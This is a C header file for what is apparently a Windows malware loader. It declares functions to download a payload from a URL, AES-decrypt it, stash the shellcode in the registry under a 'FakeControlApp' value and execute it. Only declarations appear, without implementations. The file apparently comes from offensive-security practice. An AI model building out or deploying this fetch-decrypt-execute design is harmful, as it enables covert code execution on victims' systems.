#pragma once

#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "aes.h"

#pragma comment(lib, "Wininet.lib")

#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16

#define		REGISTRY	"Control Panel"
#define		REGSTRING	"FakeControlApp"

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)
#define in(msg, ...) printf("[#] " msg "\n", ##__VA_ARGS__)


BOOL ReadShellcodeFromRegistry(OUT PBYTE* ppPayload, OUT SIZE_T* psSize);
BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize);
BOOL RunShellCode(IN PVOID pDecryptedShellCode, IN SIZE_T sDecryptedShellcodeSize);

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);

BOOL AesDecryptBuffer(IN PBYTE pEncryptedData, IN SIZE_T DataSize, IN PBYTE pKey, IN PBYTE pIv);